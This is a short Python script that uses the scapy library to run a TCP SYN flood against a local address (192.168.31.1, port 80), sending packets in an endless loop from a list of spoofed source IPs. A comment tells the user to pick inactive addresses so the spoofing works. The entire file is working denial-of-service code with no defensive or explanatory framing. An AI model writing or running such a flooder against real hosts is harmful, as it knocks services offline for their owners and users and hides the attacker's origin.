import scapy.all as s


def make_SYN_msg(target_ip,src_ip,target_port = 80):
    return s.IP(dst = target_ip, src = src_ip) /s.TCP(sport = s.RandShort(), dport = target_port, flags = "S")



if __name__ == "__main__":
    target_port = 80
    target_ip =  "192.168.31.1"
    print("sending the syn msgs")
    src_ips = ["192.168.31.112","192.168.31.32","192.168.31.100","192.168.31.136"]#you mast pot here ips that are not active!!!
    try:
        while True:
            for src_ip in src_ips:
                s.send(make_SYN_msg(target_ip,src_ip, target_port), verbose=False)
    except KeyboardInterrupt:
        print("\nStopped sending packets.")

    